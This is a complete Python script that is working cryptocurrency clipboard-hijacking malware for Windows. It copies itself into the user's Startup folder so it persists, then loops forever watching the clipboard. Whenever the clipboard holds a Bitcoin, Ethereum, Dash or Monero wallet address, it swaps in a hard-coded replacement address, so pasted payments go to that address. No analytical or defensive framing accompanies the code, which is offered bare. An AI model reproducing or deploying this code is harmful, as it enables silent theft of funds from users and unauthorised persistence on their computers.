import pyperclip
from subprocess import check_call
import re
import os
import shutil
import sys



def auto_run():

    current_location = sys.argv[0]
    application_name = os.path.basename(current_location)
    startup_folder = os.path.join(os.environ['USERPROFILE'],'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
    target_location = os.path.join(startup_folder,application_name)

    if not os.path.exists(target_location):

        try:
            shutil.copy(current_location, startup_folder)

        except:
            pass # This could be optimised with other instructions..

def address_swap():

    try:
        clipboard_data = pyperclip.paste()
        if re.search('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', clipboard_data):
            pyperclip.copy('bc1qmsyzncyge2uwhqn47m40sa08xq7qh4yllyfvh3')
            pyperclip.paste()

        if re.search('^0x[a-fA-F0-9]{40}$', clipboard_data):
            pyperclip.copy('0xc2a3f46704b3265446359b0f1da42f24b9482eef')
            pyperclip.paste()
            
        
        if re.search('X[1-9A-HJ-NP-Za-km-z]{33}$', clipboard_data):
            pyperclip.copy('XbRfVkCnQxkLVQA3HMsnkbPsUrfnuCitMJ')
            pyperclip.paste()
        
        if re.search('4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$', clipboard_data):
            pyperclip.copy('41nizz95at5QEZ9ZhLi2mUHVHEHhbDSXB4Q3uMNFh5H8H7w9TtRzZ3qQkkMdkf7B3v7TVMCZ63gmqgaSkWtgjnv5L9Ke7cR')
            pyperclip.paste()

    except:
        data = None

def loop_through():
    
    while True:
        address_swap()


auto_run()
loop_through()











